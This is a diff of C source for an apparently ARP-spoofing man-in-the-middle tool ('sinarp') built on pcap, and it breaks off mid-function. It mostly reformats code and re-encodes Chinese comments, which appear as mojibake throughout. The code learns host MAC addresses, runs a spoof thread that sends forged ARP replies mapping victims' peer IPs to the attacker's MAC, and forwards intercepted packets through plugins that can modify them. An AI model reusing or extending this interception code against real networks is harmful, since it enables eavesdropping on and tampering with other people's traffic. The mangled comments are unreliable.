+void   sinarp_packet_handler(u_char *param, const struct pcap_pkthdr *header,
+                             const u_char *pkt_data)
 {
     ETHeader *eh;
     IPHeader *ih;
     ARPHeader *arp_hdr;
-    BOOL bRet = FALSE;
-    u_int ip_len=0, pro_len=0, data_len=0;
+    //BOOL bRet = FALSE;
+    //u_int ip_len = 0, pro_len = 0, data_len = 0;
     u_int pkt_len = header->len;
     uint32 idx = 0;
     eh = (ETHeader *) pkt_data;
-    if(pkt_len < 14)
-        return; 
+    if (pkt_len < 14)
+        return;
     ++g_packet_count;
-    if(eh->type == htons(ETHERTYPE_ARP))
+    if (eh->type == htons(ETHERTYPE_ARP))
     {
-        //ÊÇ¸ö ARP °ü  ÄÇÃ´¿´¿´ÊÇ²»ÊÇARP»Ø¸´°ü¡£¡£
+        //æ˜¯ä¸ª ARP åŒ…  é‚£ä¹ˆçœ‹çœ‹æ˜¯ä¸æ˜¯ARPå›å¤åŒ…ã€‚ã€‚
         arp_hdr = (ARPHeader *)((uint8 *)eh + 14);
-        if(arp_hdr->opcode == htons(ARP_REPLY))  //ARP »Ø¸´°ü
+        if (arp_hdr->opcode == htons(ARP_REPLY)) //ARP å›å¤åŒ…
         {
-            //·¢ËÍÕßµÄ IP ºÍ MAC¡¡¾ÍÊÇÒª¸æËßÎÒÃÇµÄ¡¡IP¡¡ºÍ¡¡MAC¶ÔÓ¦¹ØÏµ
-            //DBG_MSG("ARP tel: %s --> %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",sinarp_iptos(arp_hdr->saddr),\
-            //   arp_hdr->smac[0],arp_hdr->smac[1],arp_hdr->smac[2],arp_hdr->smac[3],arp_hdr->smac[4],arp_hdr->smac[5]);
-            //¿´¿´Õâ¸ö ip ÊÇ²»ÊÇÔÚÎÒÃÇµÄ C ¶ÎÀïÃæ
-            if(((g_my_ip & 0x00FFFFFF) ^ (arp_hdr->saddr & 0x00FFFFFF)) == 0 && g_HostList[arp_hdr->saddr >> 24].active == 0)
+            //å‘é€è€…çš„ IP å’Œ MACã€€å°±æ˜¯è¦å‘Šè¯‰æˆ‘ä»¬çš„ã€€IPã€€å’Œã€€MACå¯¹åº”å…³ç³»
+            DBG_MSG("ARP tel: %s --> %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", sinarp_iptos(arp_hdr->saddr), \
+                    arp_hdr->smac[0], arp_hdr->smac[1], arp_hdr->smac[2], arp_hdr->smac[3], arp_hdr->smac[4], arp_hdr->smac[5]);
+            //çœ‹çœ‹è¿™ä¸ª ip æ˜¯ä¸æ˜¯åœ¨æˆ‘ä»¬çš„ C æ®µé‡Œé¢
+            if (((g_my_ip & 0x00FFFFFF) - (arp_hdr->saddr & 0x00FFFFFF)) == 0 &&
+                    g_HostList[arp_hdr->saddr >> 24].active == 0)
             {
-                //ÉèÖÃÕâ¸ö ip ÔÚ ip ±íÀïÃæ¶ÔÓ¦µÄ MAC
-                memcpy(g_HostList[arp_hdr->saddr >> 24].mac,arp_hdr->smac,6);
+                DBG_MSG("add mac entry ... \n");
+                //è®¾ç½®è¿™ä¸ª ip åœ¨ ip è¡¨é‡Œé¢å¯¹åº”çš„ MAC
+                memcpy(g_HostList[arp_hdr->saddr >> 24].mac, arp_hdr->smac, 6);
                 g_HostList[arp_hdr->saddr >> 24].active = 1;
             }
         }
     }
-    if(g_auto_ip_forward == 1)
+    if (g_auto_ip_forward == 1)
     {
-        //×ª·¢ ip Êı¾İ°ü¡£¡£
-        if(eh->type != htons(ETHERTYPE_IP))
-            return; // Ö»×ª·¢IP°ü
+        //è½¬å‘ ip æ•°æ®åŒ…ã€‚ã€‚
+        if (eh->type != htons(ETHERTYPE_IP))
+            return; // åªè½¬å‘IPåŒ…
 
-        // ÕÒµ½IPÍ·µÄÎ»ÖÃºÍµÃµ½IPÍ·µÄ³¤¶È
-        ih = (IPHeader *) ((u_char*)eh + 14); //14ÎªÒÔÌ«Í·µÄ³¤¶È
+        // æ‰¾åˆ°IPå¤´çš„ä½ç½®å’Œå¾—åˆ°IPå¤´çš„é•¿åº¦
+        ih = (IPHeader *) ((u_char *)eh + 14); //14ä¸ºä»¥å¤ªå¤´çš„é•¿åº¦
         /*
-        ÅĞ¶Ï ÎÒÃÇÒª²»Òª×ª·¢ Êı¾İ°ü
-        ÏÈÅĞ¶Ï °üÊÇ²»ÊÇ·¢¸ø×Ô¼ºµÄ (ÅĞ¶Ï ip Í·ÀïµÄ Ä¿±ê ip ÊÇ²»ÊÇÎÒÃÇµÄip)
-        È»ºó ´ÓÖ÷»úÁĞ±íÀïÃæ ²éÕÒ ip ¶ÔÓ¦µÄ mac Èç¹ûÊÇ»î¶¯µÄÖ÷»ú ÄÇÃ´È¡³öÆä mac ²¢Ìæ»» ½ÓÊÕµ½µÄÊı¾İ°üµÄ Ä¿±ê mac ²¢·¢ËÍ³öÈ¥					  
-        Ê¹ÓÃ pcap_sendpacket ·¢³öÈ¥µÄ°ü Ò²»á±» pcap ²¶»ñµ½
+        åˆ¤æ–­ æˆ‘ä»¬è¦ä¸è¦è½¬å‘ æ•°æ®åŒ…
+        å…ˆåˆ¤æ–­ åŒ…æ˜¯ä¸æ˜¯å‘ç»™è‡ªå·±çš„ (åˆ¤æ–­ ip å¤´é‡Œçš„ ç›®æ ‡ ip æ˜¯ä¸æ˜¯æˆ‘ä»¬çš„ip)
+        ç„¶å ä»ä¸»æœºåˆ—è¡¨é‡Œé¢ æŸ¥æ‰¾ ip å¯¹åº”çš„ mac å¦‚æœæ˜¯æ´»åŠ¨çš„ä¸»æœº é‚£ä¹ˆå–å‡ºå…¶ mac å¹¶æ›¿æ¢ æ¥æ”¶åˆ°çš„æ•°æ®åŒ…çš„ ç›®æ ‡ mac å¹¶å‘é€å‡ºå»
+        ä½¿ç”¨ pcap_sendpacket å‘å‡ºå»çš„åŒ… ä¹Ÿä¼šè¢« pcap æ•è·åˆ°
         */
         /*
-        Èç¹û °üµÄÄ¿±êµØÖ·ÊÇÎÒµÄ mac µ«ÊÇ Ä¿±ê ip ²»ÊÇÎÒµÄ ip ÄÇÃ´Õâ¸ö°ü¾ÍÊÇÎÒÒª×ª·¢µÄ  ×÷ÎªÖĞ¼äÈË ÎÒÃÇÓĞÔğÈÎ×ª·¢ ~~
+        å¦‚æœ åŒ…çš„ç›®æ ‡åœ°å€æ˜¯æˆ‘çš„ mac ä½†æ˜¯ ç›®æ ‡ ip ä¸æ˜¯æˆ‘çš„ ip é‚£ä¹ˆè¿™ä¸ªåŒ…å°±æ˜¯æˆ‘è¦è½¬å‘çš„  ä½œä¸ºä¸­é—´äºº æˆ‘ä»¬æœ‰è´£ä»»è½¬å‘ ~~
         */
-        if((ih->ipDestination !=  g_my_ip) && (memcmp(g_my_mac,eh->dhost,6) == 0))
+        if ((ih->ipDestination !=  g_my_ip) && (memcmp(g_my_mac, eh->dhost, 6) == 0))
         {
-            // µ÷ÓÃ²å¼şÀ´´¦ÀíÊı¾İ°ü£¨°üĞŞ¸ÄÆ÷£©
-            if(g_plugin_list.count > 0)
+            // è°ƒç”¨æ’ä»¶æ¥å¤„ç†æ•°æ®åŒ…ï¼ˆåŒ…ä¿®æ”¹å™¨ï¼‰
+            if (g_plugin_list.count > 0)
             {
-                //ÒÀ´Î»ñµÃÃ¿¸ö²å¼şµÄ Êı¾İ°ü´¦ÀíÖ¸Õë À´´¦ÀíÊı¾İ°ü
-                for (idx  = 0 ;idx < g_plugin_list.count;idx ++)
+                //ä¾æ¬¡è·å¾—æ¯ä¸ªæ’ä»¶çš„ æ•°æ®åŒ…å¤„ç†æŒ‡é’ˆ æ¥å¤„ç†æ•°æ®åŒ…
+                for (idx  = 0 ; idx < g_plugin_list.count; idx ++)
                 {
-                    if(g_plugin_list.plugin[idx].process_packet(eh,pkt_len) == FALSE)
-                        return; 
+                    if (g_plugin_list.plugin[idx].process_packet(eh, pkt_len) == FALSE)
+                        return;
                 }
             }
 
@@ -857,11 +858,11 @@ void   sinarp_packet_handler(u_char *param, const struct pcap_pkthdr *header,
 void sinarp_do_capture()
 {
     int ret;
-
-    while(!g_is_time_shutdown)
+    sinarp_printf("capture thread start ... \n");
+    while (!g_is_time_shutdown)
     {
-        ret = pf_pcap_loop(g_adhandle, 1, (pcap_handler)sinarp_packet_handler,NULL);
-        if(ret == 0)
+        ret = pf_pcap_loop(g_adhandle, 1, (pcap_handler)sinarp_packet_handler, NULL);
+        if (ret == 0)
         {
             continue;
         }
@@ -873,24 +874,25 @@ void sinarp_do_capture()
     }
 }
 
-pcap_if_t * sinarp_get_ifs()
+pcap_if_t *sinarp_get_ifs()
 {
     pcap_if_t /* *dev, *pdev, *ndev,*/ *g_devs = NULL;
     char pcap_errbuf[PCAP_ERRBUF_SIZE];
     //DBG_MSG("enter : %s \n",__FUNCTION__);
     /* retrieve the list */
     if (pf_pcap_findalldevs((pcap_if_t **)&g_devs, pcap_errbuf) == -1)
-    {	//DBG_MSG("%s", pcap_errbuf);
+    {
+        //DBG_MSG("%s", pcap_errbuf);
         return NULL;
     }
 
     /* analize the list and remove unwanted entries */
-    //    for (pdev = dev = (pcap_if_t *)g_devs; dev != NULL; dev = ndev) 
+    //    for (pdev = dev = (pcap_if_t *)g_devs; dev != NULL; dev = ndev)
     //   {
     /* the next entry in the list */
     //        ndev = dev->next;
     /* set the description for the local loopback */
-    //        if (dev->flags & PCAP_IF_LOOPBACK) 
+    //        if (dev->flags & PCAP_IF_LOOPBACK)
     //        {
     //            SAFE_FREE(dev->description);
     //            dev->description = _strdup("Local Loopback");
@@ -901,7 +903,7 @@ pcap_if_t * sinarp_get_ifs()
     //            dev->description = dev->name;
 
     /* remove the pseudo device 'any' */
-    //        if (!strcmp(dev->name, "any")) 
+    //        if (!strcmp(dev->name, "any"))
     //        {
     /* check if it is the first in the list */
     //           if (dev == g_devs)
@@ -924,19 +926,19 @@ int sinarp_show_ifs(pcap_if_t *g_devs)
 {
     uint32 idx = 0;
     pcap_if_t *dev;
-    fprintf(stdout, "\nList of available Network Interfaces:\n\n");
+    sinarp_printf("\nList of available Network Interfaces:\n\n");
     for (dev = (pcap_if_t *)g_devs; dev != NULL; dev = dev->next)
     {
-        printf("%d. ",++idx);
+        sinarp_printf("%d. ", ++idx);
         sinarp_ifprint(dev);
     }
     return idx;
 }
 
 /*
-¸ù¾İÍø¿¨µÄĞòºÅ·µ»ØÍø¿¨µÄ
+æ ¹æ®ç½‘å¡çš„åºå·è¿”å›ç½‘å¡çš„
 */
-pcap_if_t *sinarp_get_if_by_id(pcap_if_t *g_devs,uint32 id)
+pcap_if_t *sinarp_get_if_by_id(pcap_if_t *g_devs, uint32 id)
 {
     uint32 idx = 0;
     pcap_if_t *dev;
@@ -944,13 +946,13 @@ pcap_if_t *sinarp_get_if_by_id(pcap_if_t *g_devs,uint32 id)
     fprintf(stdout, "List of available Network Interfaces:\n\n");
     for (dev = (pcap_if_t *)g_devs; dev != NULL; dev = dev->next)
     {
-        if(++idx == id)
+        if (++idx == id)
             return dev;
     }
     return NULL;
 }
 
-uint32   sinarp_hostname_to_ip(char * hostname)
+uint32   sinarp_hostname_to_ip(char *hostname)
 {
     struct hostent *he;
     struct in_addr **addr_list;
@@ -962,7 +964,7 @@ uint32   sinarp_hostname_to_ip(char * hostname)
 
     addr_list = (struct in_addr **) he->h_addr_list;
 
-    for(i = 0; addr_list[i] != NULL; i++)
+    for (i = 0; addr_list[i] != NULL; i++)
     {
         //Return the first one;
         return (*addr_list[i]).s_addr;
@@ -972,47 +974,48 @@ uint32   sinarp_hostname_to_ip(char * hostname)
 }
 
 /*
-Ö»¹Ø×¢ ip  µÄ×îºóÒ»Î»  Ò²¾ÍÊÇ dword ipµÄµÚÒ»Î» 
+åªå…³æ³¨ ip  çš„æœ€åä¸€ä½  ä¹Ÿå°±æ˜¯ dword ipçš„ç¬¬ä¸€ä½
 */
-int  sinarp_parse_host_string(const char *host_string,host_type type)
+int  sinarp_parse_host_string(const char *host_string, host_type type)
 {
     const char *p = host_string;
     char *slash = NULL;
     char buff[256];
-    char startIpStr[256]={0};
-    uint32 start,end,range,submask,ip,idx;
+    char startIpStr[256] = {0};
+    uint32 start, end, range, submask, ip, idx;
     int bit;
 
-    while((p = sinarp_take_out_string_by_char(p,buff,256,',')))
+    while ((p = sinarp_take_out_string_by_char(p, buff, 256, ',')))
     {
         start = end = range = submask = 0;
-        if((slash = strchr(buff,'/'))) //12.12.12.12/24
+        if ((slash = strchr(buff, '/'))) //12.12.12.12/24
         {
             strncpy(startIpStr, buff, slash - buff );
-            bit = atoi(slash+1);
-            if(bit < 24)
+            bit = atoi(slash + 1);
+            if (bit < 24)
             {
                 return 0;
             }
             range = 0xFFFFFFFF >> bit;
             submask = 0xFFFFFFFF << (32 - bit);
             ip = sinarp_hostname_to_ip(startIpStr);
-            if(!ip)
+            if (!ip)
             {
-                DBG_MSG("host %s not find \n",startIpStr);
+                DBG_MSG("host %s not find \n", startIpStr);
                 return 0;
             }
             start = (ip & ntohl(submask)) + ntohl(1);
-            end = (ip & ntohl(submask)) + ntohl(range-1);
+            end = (ip & ntohl(submask)) + ntohl(range - 1);
 
         }
-        else if((slash = strchr(buff,'-')))  //12.12.12.12 - 12.12.12.122
+        else if ((slash = strchr(buff, '-'))) //12.12.12.12 - 12.12.12.122
         {
             strncpy(startIpStr, buff, slash - buff );
             start = sinarp_hostname_to_ip(startIpStr);
-            end = sinarp_hostname_to_ip(slash+1);
+            end = sinarp_hostname_to_ip(slash + 1);
 
-        }else //12.12.12.12
+        }
+        else  //12.12.12.12
         {
             start = sinarp_hostname_to_ip(buff);
             end = start;
@@ -1033,19 +1036,19 @@ int  sinarp_parse_host_string(const char *host_string,host_type type)
 
 /* From tcptraceroute, convert a numeric IP address to a string */
 #define IPTOSBUFFERS    12
-char *   sinarp_iptos(u_long in)
+char    *sinarp_iptos(u_long in)
 {
-    static char output[IPTOSBUFFERS][3*4+3+1];
+    static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
     static short which;
     u_char *p;
 
     p = (u_char *)&in;
     which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
-    snprintf(output[which], sizeof(output[which]),"%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
+    snprintf(output[which], sizeof(output[which]), "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
     return output[which];
 }
 
-char* sinarp_ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
+char *sinarp_ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
 {
     socklen_t sockaddrlen;
 
@@ -1055,35 +1058,35 @@ char* sinarp_ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
     sockaddrlen = sizeof(struct sockaddr_storage);
 #endif
 
-    if(getnameinfo(sockaddr, 
-        sockaddrlen, 
-        address, 
-        addrlen, 
-        NULL, 
-        0, 
-        NI_NUMERICHOST) != 0) address = NULL;
+    if (getnameinfo(sockaddr,
+                    sockaddrlen,
+                    address,
+                    addrlen,
+                    NULL,
+                    0,
+                    NI_NUMERICHOST) != 0) address = NULL;
 
     return address;
 }
 
 /*
-Í¨¹ıÍø¿¨µÄÃû³Æ£¨ÃèÊö£©À´µÃµ½ÆämacµØÖ· Ê¹ÓÃ windows µÄAPI
+é€šè¿‡ç½‘å¡çš„åç§°ï¼ˆæè¿°ï¼‰æ¥å¾—åˆ°å…¶macåœ°å€ ä½¿ç”¨ windows çš„API
 */
-BOOL sinarp_get_mac_from_if_name(const char *if_name,uint8 *mac)
+BOOL sinarp_get_mac_from_if_name(const char *if_name, uint8 *mac)
 {
 #ifdef WIN32
-    PIP_ADAPTER_INFO pInfo = NULL,pInfoTemp = NULL;
+    PIP_ADAPTER_INFO pInfo = NULL, pInfoTemp = NULL;
     ULONG ulSize = 0;
     int i;
-    GetAdaptersInfo(pInfo,&ulSize); // First call get buff size
+    GetAdaptersInfo(pInfo, &ulSize); // First call get buff size
     pInfo = (PIP_ADAPTER_INFO)malloc(ulSize);
     GetAdaptersInfo(pInfo, &ulSize);
     pInfoTemp = pInfo;
-    while(pInfo)
+    while (pInfo)
     {
-        if (strcmp(pInfo->AdapterName,if_name)>=0)
+        if (strcmp(pInfo->AdapterName, if_name) >= 0)
         {
-            for( i=0; i < (int)pInfo->AddressLength; i++)
+            for ( i = 0; i < (int)pInfo->AddressLength; i++)
                 mac[i] = pInfo->Address[i];
             // Get Last Ip Address To szIPAddr
             //             PIP_ADDR_STRING pAddTemp=&(pInfo->IpAddressList);
@@ -1099,7 +1102,7 @@ BOOL sinarp_get_mac_from_if_name(const char *if_name,uint8 *mac)
             free(pInfoTemp);
             return TRUE;
         }
-        pInfo = pInfo->Next; 
+        pInfo = pInfo->Next;
     }
     free(pInfoTemp);
     return FALSE;
@@ -1112,12 +1115,12 @@ BOOL sinarp_get_mac_from_if_name(const char *if_name,uint8 *mac)
     strcpy(buffer.ifr_name, if_name);
     ret = ioctl(s, SIOCGIFHWADDR, &buffer);
     close(s);
-    if(ret != -1)
+    if (ret != -1)
     {
-        memcpy(mac,buffer.ifr_hwaddr.sa_data,6);
+        memcpy(mac, buffer.ifr_hwaddr.sa_data, 6);
         return TRUE;
     }
-    sinarp_printf("%s\n","sinarp_get_mac_from_if_name():ioctl failed !!");
+    sinarp_printf("%s\n", "sinarp_get_mac_from_if_name():ioctl failed !!");
     return FALSE;
 #endif
 }
@@ -1143,7 +1146,7 @@ int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
     do
     {
         /* Recieve response from the kernel */
-        if((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0)
+        if ((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0)
         {
             //perror("SOCK READ: ");
             return -1;
@@ -1152,14 +1155,14 @@ int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
         nlHdr = (struct nlmsghdr *)bufPtr;
 
         /* Check if the header is valid */
-        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR))
+        if ((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR))
         {
             //perror("Error in recieved packet");
             return -1;
         }
 
         /* Check if the its the last message */
-        if(nlHdr->nlmsg_type == NLMSG_DONE)
+        if (nlHdr->nlmsg_type == NLMSG_DONE)
         {
             break;
         }
@@ -1171,12 +1174,13 @@ int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
         }
 
         /* Check if its a multi part message */
-        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0)
+        if ((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0)
         {
             /* return if its not */
             break;
         }
-    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));
+    }
+    while ((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));
 
     return msgLen;
 }
@@ -1193,7 +1197,7 @@ void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)
     rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);
 
     /* If the route is not for AF_INET or does not belong to main routing table then return. */
-    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
+    if ((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
         return;
 
     /* get the rtattr field */
@@ -1201,9 +1205,9 @@ void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)
     rtLen = RTM_PAYLOAD(nlHdr);
 
     //printf("start,..................\n");
-    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen))
+    for (; RTA_OK(rtAttr, rtLen); rtAttr = RTA_NEXT(rtAttr, rtLen))
     {
-        switch(rtAttr->rta_type)
+        switch (rtAttr->rta_type)
         {
         case RTA_OIF:
             if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
@@ -1234,36 +1238,36 @@ void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)
 #endif
 
 /*
-Í¨¹ı ip ²éÕÒÆäÄ¬ÈÏµÄÍø¹ØµØÖ·
-Ò²ÊÇÊ¹ÓÃwindowsµÄAPI  ²»ÖªµÀ×îºóÒÆÖ²µ½ Linux ÒªÔõÃ´Ñù¸ã
+é€šè¿‡ ip æŸ¥æ‰¾å…¶é»˜è®¤çš„ç½‘å…³åœ°å€
+ä¹Ÿæ˜¯ä½¿ç”¨windowsçš„API  ä¸çŸ¥é“æœ€åç§»æ¤åˆ° Linux è¦æ€ä¹ˆæ ·æ
 */
-BOOL sinarp_get_gw_from_ip(uint32 ip,uint32 *gw)
+BOOL sinarp_get_gw_from_ip(uint32 ip, uint32 *gw)
 {
 #ifdef WIN32
     PIP_ADAPTER_INFO pInfo = NULL;
     PIP_ADAPTER_INFO pInfoTemp = NULL;
     ULONG ulSize = 0;
     PIP_ADDR_STRING pAddTemp;
-    GetAdaptersInfo(pInfo,&ulSize); // First call get buff size
+    GetAdaptersInfo(pInfo, &ulSize); // First call get buff size
     pInfo = (PIP_ADAPTER_INFO) malloc(ulSize);
     GetAdaptersInfo(pInfo, &ulSize);
     pInfoTemp = pInfo;
     *gw = 0;
-    while(pInfo)
+    while (pInfo)
     {
         // Get Last Ip Address To szIPAddr
-        pAddTemp=&(pInfo->IpAddressList);
-        while(pAddTemp)
+        pAddTemp = &(pInfo->IpAddressList);
+        while (pAddTemp)
         {
-            if(inet_addr(pAddTemp->IpAddress.String) == ip)
+            if (inet_addr(pAddTemp->IpAddress.String) == ip)
             {
                 *gw = inet_addr(pInfo->GatewayList.IpAddress.String);
                 free(pInfoTemp);
                 return TRUE;
             }
-            pAddTemp=pAddTemp->Next;
+            pAddTemp = pAddTemp->Next;
         }
-        pInfo = pInfo->Next; 
+        pInfo = pInfo->Next;
     }
     free(pInfoTemp);
     return FALSE;
@@ -1278,10 +1282,10 @@ BOOL sinarp_get_gw_from_ip(uint32 ip,uint32 *gw)
     *gw = 0;
 
     /* Create Socket */
-    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)
+    if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)
     {
         perror("Socket Creation: ");
-        return(-1);
+        return (-1);
     }
 
     /* Initialize the buffer */
@@ -1300,14 +1304,14 @@ BOOL sinarp_get_gw_from_ip(uint32 ip,uint32 *gw)
     nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.
 
     /* Send the request */
-    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0)
+    if (send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0)
     {
         fprintf(stderr, "Write To Socket Failed...\n");
         return -1;
     }
 
     /* Read the response */
-    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0)
+    if ((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0)
     {
         fprintf(stderr, "Read From Socket Failed...\n");
         return -1;
@@ -1316,7 +1320,7 @@ BOOL sinarp_get_gw_from_ip(uint32 ip,uint32 *gw)
     /* Parse and print the response */
     rtInfo = (struct route_info *)malloc(sizeof(struct route_info));
 
-    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len))
+    for (; NLMSG_OK(nlMsg, len); nlMsg = NLMSG_NEXT(nlMsg, len))
     {
         memset(rtInfo, 0, sizeof(struct route_info));
         parseRoutes(nlMsg, rtInfo);
@@ -1324,9 +1328,9 @@ BOOL sinarp_get_gw_from_ip(uint32 ip,uint32 *gw)
         // Check if default gateway
         if (rtInfo->dstAddr.s_addr == 0)
         {
-            if((rtInfo->gateWay.s_addr & 0x00FFFFFF) == (ip & 0x00FFFFFF))
+            if ((rtInfo->gateWay.s_addr & 0x00FFFFFF) == (ip & 0x00FFFFFF))
             {
-                //ÔÚÒ»¸ö×ÓÍøÀï ¾ÍÈÏÎªÊÇ¶ÔÓ¦µÄÍø¹ØµØÖ· 
+                //åœ¨ä¸€ä¸ªå­ç½‘é‡Œ å°±è®¤ä¸ºæ˜¯å¯¹åº”çš„ç½‘å…³åœ°å€
                 *gw = rtInfo->gateWay.s_addr;
                 break;
             }
@@ -1338,7 +1342,7 @@ BOOL sinarp_get_gw_from_ip(uint32 ip,uint32 *gw)
 
     free(rtInfo);
     close(sock);
-    if(*gw)
+    if (*gw)
         return TRUE;
     return FALSE;
 #endif
@@ -1353,32 +1357,32 @@ void sinarp_ifprint(pcap_if_t *d)
     // struct sockaddr_dl *link;
 
     /* Name */
-    printf("%s\n",d->name);
+    printf("%s\n", d->name);
 
     /* Description */
     if (d->description)
-        printf("\tDescription: %s\n",d->description);
+        printf("\tDescription: %s\n", d->description);
 
     /* Loopback Address*/
-    printf("\tLoopback: %s\n",(d->flags & PCAP_IF_LOOPBACK)?"yes":"no");
+    printf("\tLoopback: %s\n", (d->flags & PCAP_IF_LOOPBACK) ? "yes" : "no");
 
     /* IP addresses */
-    for(a=d->addresses;a;a=a->next) 
+    for (a = d->addresses; a; a = a->next)
     {
-        printf("\tAddress Family: #%d\n",a->addr->sa_family);
+        printf("\tAddress Family: #%d\n", a->addr->sa_family);
 
-        switch(a->addr->sa_family)
+        switch (a->addr->sa_family)
         {
         case AF_INET:
             printf("\tAddress Family Name: AF_INET\n");
             if (a->addr)
-                printf("\tAddress: %s\n",sinarp_iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
+                printf("\tAddress: %s\n", sinarp_iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
             if (a->netmask)
-                printf("\tNetmask: %s\n",sinarp_iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
+                printf("\tNetmask: %s\n", sinarp_iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
             if (a->broadaddr)
-                printf("\tBroadcast Address: %s\n",sinarp_iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
+                printf("\tBroadcast Address: %s\n", sinarp_iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
             if (a->dstaddr)
-                printf("\tDestination Address: %s\n",sinarp_iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
+                printf("\tDestination Address: %s\n", sinarp_iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
             break;
 
         case AF_INET6:
@@ -1386,7 +1390,7 @@ void sinarp_ifprint(pcap_if_t *d)
             if (a->addr)
                 printf("\tAddress: %s\n", sinarp_ip6tos(a->addr, ip6str, sizeof(ip6str)));
             break;
-            // Ã²ËÆÔÚ windows ÉÏ²»ÄÜÊ¹ÓÃ winpcap À´»ñµÃ Íø¿¨µÄ MAC µØÖ· ¡£»¹ÊÇµÄÊ¹ÓÃwindowsµÄAPIÀ´¸ã¡£¡£
+            // è²Œä¼¼åœ¨ windows ä¸Šä¸èƒ½ä½¿ç”¨ winpcap æ¥è·å¾— ç½‘å¡çš„ MAC åœ°å€ ã€‚è¿˜æ˜¯çš„ä½¿ç”¨windowsçš„APIæ¥æã€‚ã€‚
 
             // case AF_LINK:
             //      if(a->addr->sa_data != NULL)
@@ -1409,7 +1413,7 @@ void sinarp_ifprint(pcap_if_t *d)
             //               (unsigned char)a->addr->sa_data[4],
             //              (unsigned char)a->addr->sa_data[5]);
             //}
-            // else if(link->sdl_alen > 6) 
+            // else if(link->sdl_alen > 6)
             //  {
             // This is what happens in OSX 10.6.5
             //     sprintf(ret, "%02x:%02x:%02x:%02x:%02x:%02x",
@@ -1430,72 +1434,72 @@ void sinarp_ifprint(pcap_if_t *d)
 }
 
 /*
-·¢ËÍÆÛÆ­Êı¾İ°üµÄÏß³Ì
+å‘é€æ¬ºéª—æ•°æ®åŒ…çš„çº¿ç¨‹
 */
 #ifdef WIN32
 DWORD __stdcall sinarp_spoof_thread(void *lparam)
 #else
-void * sinarp_spoof_thread(void *lparam)
+void *sinarp_spoof_thread(void *lparam)
 #endif
 {
-    int i,j;
+    int i, j;
     g_is_spoof_thread_active = 1;
     do
     {
-        switch(g_spoof_type)
+        switch (g_spoof_type)
         {
-        case SPOOF_A:  
+        case SPOOF_A:
+        {
+            //  A ---> M ---> B
+            //å‘  Aã€€ä¸­çš„ä¸»æœºå‘é€ã€€ARPã€€å‘Šè¯‰ã€€æˆ‘ã€€æ˜¯ã€€Bã€€ä¹Ÿå°±æ˜¯ B çš„ ip å¯¹åº”æˆ‘çš„ MAC åœ°å€
+            for (i = 0; i < 0xFF ; i++)
             {
-                //  A ---> M ---> B
-                //Ïò  A¡¡ÖĞµÄÖ÷»ú·¢ËÍ¡¡ARP¡¡¸æËß¡¡ÎÒ¡¡ÊÇ¡¡B¡¡Ò²¾ÍÊÇ B µÄ ip ¶ÔÓ¦ÎÒµÄ MAC µØÖ·
-                for (i = 0;i < 0xFF ;i++)
+                if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                 {
-                    if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
+                    for (j = 0 ; j < 0xFF; j++)
                     {
-                        for (j = 0 ;j < 0xFF;j++)
+                        if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                         {
-                            if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
-                            {
-                                sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_my_mac);
-                            }
+                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
                         }
                     }
                 }
             }
-            break;
+        }
+        break;
         case SPOOF_AB:
+        {
+            // Aã€€<---> M <---> B
+            //å‘Šè¯‰ã€€A æˆ‘æ˜¯ B
+            for (i = 0; i < 0xFF ; i++)
             {
-                // A¡¡<---> M <---> B
